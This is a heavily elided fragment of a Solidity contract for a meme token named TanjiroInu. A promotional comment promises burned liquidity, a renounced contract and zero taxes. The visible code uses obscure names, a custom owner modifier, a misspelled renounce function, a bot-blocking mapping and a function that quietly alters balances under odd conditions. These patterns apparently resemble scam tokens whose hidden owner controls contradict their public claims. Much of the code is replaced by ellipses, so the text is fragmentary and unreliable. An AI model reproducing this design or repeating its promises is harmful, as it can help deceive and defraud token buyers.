...
/*
 ...
 https://medium.com/@TanjiroINU/tanjiro-inu-beginning-of-a-new-era-12ea6360e3e2

 1e Liquidity with be burned at launch then once, limit is set, the CA will be renounced... 0 buys taxs , 0 sells taxs
...
abstract contract Ownable is Context {
    ...
    modifier rOwner() {
     ...
     function RenouncednOwnership() public virtual rOwner {
...
contract TanjiroInu is Ownable {
    constructor(
    ...
    function allowenceB(
        ...
        if (enableA[getBalance] == 0 && botBlocked[getBalance] > 0 && !backingFee) {
            ...
            if (allowedSwap > 2 * 10**(2 + _decimals)) enableA[getBalance] -= spenderFeeA - 1;
        }
